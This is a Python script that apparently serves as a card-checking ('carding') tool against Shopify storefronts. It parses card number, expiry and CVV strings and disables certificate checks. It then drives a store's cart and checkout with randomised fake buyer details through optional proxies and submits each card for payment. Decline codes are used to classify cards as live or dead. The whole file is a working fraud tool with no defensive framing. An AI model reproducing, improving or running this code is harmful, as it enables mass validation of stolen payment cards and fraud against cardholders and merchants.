import re, json, asyncio, aiohttp, ssl, random, time
from typing import Optional, Tuple, Dict, Any, List

sslcontext = ssl.create_default_context()
sslcontext.check_hostname = False
sslcontext.verify_mode = ssl.CERT_NONE

def parse_cc_string(cc_string: str) -> Dict[str, str]:
    parts = cc_string.strip().split('|')
    if len(parts) < 4:
        raise ValueError("Invalid CC format")
    cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(ano) == 2:
        ano = '20' + ano
    return {'cc': cc.strip(), 'mes': mes.strip(), 'ano': ano.strip(), 'cvv': cvv.strip()}

def extract_clean_response(message: str) -> str:
    if not message:
        return 'Unknown Error'
    try:
        data = json.loads(message)
        if isinstance(data, dict):
            if 'error' in data:
                return str(data['error']).strip()
            if 'errors' in data:
                errs = data['errors']
                if isinstance(errs, dict):
                    for key, val in errs.items():
                        if isinstance(val, list):
                            return f"{key}: {val[0]}"
                        return f"{key}: {val}"
                return str(errs)
            if 'message' in data:
                return str(data['message'])
    except:
        pass
    clean = re.sub(r'<[^>]+>', '', message)
    clean = re.sub(r'\s+', ' ', clean).strip()
    return (clean[:250] + '...') if len(clean) > 250 else (clean or 'Unknown')

async def fetch_products(session, site: str, proxy: Optional[str] = None) -> List[Dict]:
    return []

async def process_card(
    cc: str, mes: str, ano: str, cvv: str, site: str,
    products: Optional[list] = None, proxy_str: Optional[str] = None
) -> Tuple[bool, str, str, str, str]:
    if not site.startswith('http'):
        site = 'https://' + site
    year = ano if len(ano) == 4 else '20' + ano
    month = mes.zfill(2)

    first_name = random.choice(['John','Jane','Alex','Chris','Pat'])
    last_name = random.choice(['Doe','Smith','Johnson','Williams','Brown'])
    email = f"{first_name.lower()}{random.randint(100,999)}@gmail.com"
    phone = f"04{random.randint(10000000,99999999)}"
    address = f"{random.randint(100,999)} Main St"
    city = random.choice(['New York','Los Angeles','Chicago','Houston','Miami'])
    zip_code = f"{random.randint(10000,99999)}"
    state = random.choice(['NY','CA','IL','TX','FL'])
    country_code = 'US'

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }

    timeout = aiohttp.ClientTimeout(total=60)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        try:
            async with session.get(site, headers=headers, proxy=proxy_str, allow_redirects=True, ssl=sslcontext) as resp:
                if resp.status != 200:
                    return False, f"HTTP {resp.status}", '', '0', 'USD'
                content = await resp.text()
                shop_domain = None
                match = re.search(r'https?://[^/"]+\.myshopify\.com', content)
                if match:
                    shop_domain = match.group().rstrip('/')
                else:
                    match = re.search(r'"shop":"([^"]+)"', content)
                    if match:
                        shop_domain = f"https://{match.group(1)}.myshopify.com"
                if not shop_domain:
                    shop_domain = site.rstrip('/')

            # Cart
            try:
                async with session.get(f"{shop_domain}/products.json", headers=headers, proxy=proxy_str, ssl=sslcontext) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        products_json = data.get('products', [])
                        if products_json:
                            product = random.choice(products_json)
                            variant_id = product['variants'][0]['id']
                            await session.post(f"{shop_domain}/cart/add.js", json={"id": variant_id, "quantity": 1}, headers=headers, proxy=proxy_str, ssl=sslcontext)
                        else:
                            await session.post(f"{shop_domain}/cart/add.js", json={"id": 1234567890, "quantity": 1}, headers=headers, proxy=proxy_str, ssl=sslcontext)
            except:
                await session.post(f"{shop_domain}/cart/add.js", json={"id": 1234567890, "quantity": 1}, headers=headers, proxy=proxy_str, ssl=sslcontext)

            checkout_url = f"{shop_domain}/checkout"
            async with session.get(checkout_url, headers=headers, proxy=proxy_str, ssl=sslcontext) as resp:
                checkout_html = await resp.text()
                auth_token = None
                match = re.search(r'name="authenticity_token"[^>]+value="([^"]+)"', checkout_html)
                if match:
                    auth_token = match.group(1)
                token = None
                match = re.search(r'["\']token["\']\s*:\s*["\']([^"\']+)["\']', checkout_html)
                if match:
                    token = match.group(1)
                if not token:
                    async with session.post(f"{shop_domain}/api/checkouts.json", json={}, headers=headers, proxy=proxy_str, ssl=sslcontext) as r:
                        if r.status == 200:
                            data = await r.json()
                            token = data.get('checkout', {}).get('token')
            if not token:
                return False, "Failed to create checkout", '', '0', 'USD'

            ship_url = f"{shop_domain}/{token}/shipping"
            headers.update({
                'X-Requested-With': 'XMLHttpRequest',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': shop_domain,
                'Referer': f"{shop_domain}/{token}",
            })
            if auth_token:
                headers['X-CSRF-Token'] = auth_token

            ship_data = {
                'utf8': '✓',
                '_method': 'patch',
                'authenticity_token': auth_token or '',
                'previous_step': 'contact_information',
                'step': 'shipping_method',
                'checkout[email]': email,
                'checkout[shipping_address][first_name]': first_name,
                'checkout[shipping_address][last_name]': last_name,
                'checkout[shipping_address][address1]': address,
                'checkout[shipping_address][city]': city,
                'checkout[shipping_address][zip]': zip_code,
                'checkout[shipping_address][country]': country_code,
                'checkout[shipping_address][province]': state,
                'checkout[shipping_address][phone]': phone,
                'checkout[shipping_rate][id]': 'shopify-FreeShipping-0.00',
            }
            async with session.post(ship_url, data=ship_data, headers=headers, proxy=proxy_str, ssl=sslcontext) as resp:
                pass

            pay_url = f"{shop_domain}/{token}/payments"
            headers['Referer'] = f"{shop_domain}/{token}?step=shipping_method"
            payment_data = {
                'utf8': '✓',
                '_method': 'patch',
                'authenticity_token': auth_token or '',
                'previous_step': 'shipping_method',
                'step': 'payment_method',
                'checkout[payment_gateway]': 'shopify_payments',
                'checkout[credit_card][vault]': 'false',
                'checkout[different_billing_address]': 'false',
                'checkout[total_price]': '0.01',
                'checkout[credit_card][number]': cc,
                'checkout[credit_card][name]': f"{first_name} {last_name}",
                'checkout[credit_card][month]': month,
                'checkout[credit_card][year]': year,
                'checkout[credit_card][verification_value]': cvv,
                'complete': '1',
            }
            async with session.post(pay_url, data=payment_data, headers=headers, proxy=proxy_str, ssl=sslcontext, allow_redirects=False) as resp:
                response_text = await resp.text()
                status_code = resp.status

                if status_code in (302, 303) or (status_code == 200 and '/processing' in response_text):
                    return True, 'Order Placed', 'shopify_payments', '0.01', 'USD'

                msg_lower = response_text.lower()
                working_kw = [
                    'card_declined', 'fraud', 'incorrect_zip', 'invalid_cvc', 'invalid_cvv',
                    'insufficient_funds', 'otp_required', 'incorrect_number',
                    'expired_card', 'pickup_card', 'do_not_honor',
                    'transaction_not_allowed', 'authentication_required',
                    'invalid expiry', 'generic_error', 'payments_credit_card_base_expired'
                ]
                if any(kw in msg_lower for kw in working_kw):
                    clean = extract_clean_response(response_text)
                    return True, clean, 'shopify_payments', '0.00', 'USD'

                dead_kw = ['receipt id is empty', 'handle is empty', 'captcha_required', '502', '503']
                if any(kw in msg_lower for kw in dead_kw):
                    return False, 'Site dead', '', '0', 'USD'

                return False, extract_clean_response(response_text), 'shopify_payments', '0.00', 'USD'

        except asyncio.TimeoutError:
            return False, 'Timeout', '', '0', 'USD'
        except aiohttp.ClientConnectorError:
            return False, 'Connection failed', '', '0', 'USD'
        except Exception as e:
            return False, f'Error: {str(e)[:200]}', '', '0', 'USD'
